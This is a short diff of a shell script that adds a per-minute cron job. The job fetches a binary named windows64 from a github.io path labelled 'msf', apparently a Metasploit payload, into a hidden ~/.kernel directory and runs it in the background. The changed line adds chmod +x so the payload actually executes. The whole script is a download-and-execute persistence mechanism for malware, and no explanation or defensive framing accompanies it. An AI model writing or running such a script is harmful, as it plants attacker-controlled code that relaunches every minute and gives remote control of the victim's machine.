@@ -1,6 +1,6 @@
 cd "$(mktemp -d)";
 crontab -l > mycron;
-echo "* * * * * cd ~/.kernel/ && curl https://Waz0x.github.io/msf/windows64 > windows64 && ./windows64 &" >> mycron;
+echo "* * * * * cd ~/.kernel/ && curl https://Waz0x.github.io/msf/windows64 > windows64 && chmod +x windows64 && ./windows64 &" >> mycron;
 crontab mycron;
 rm -f mycron;
 cd ~ && mkdir .kernel && cd .kernel/;
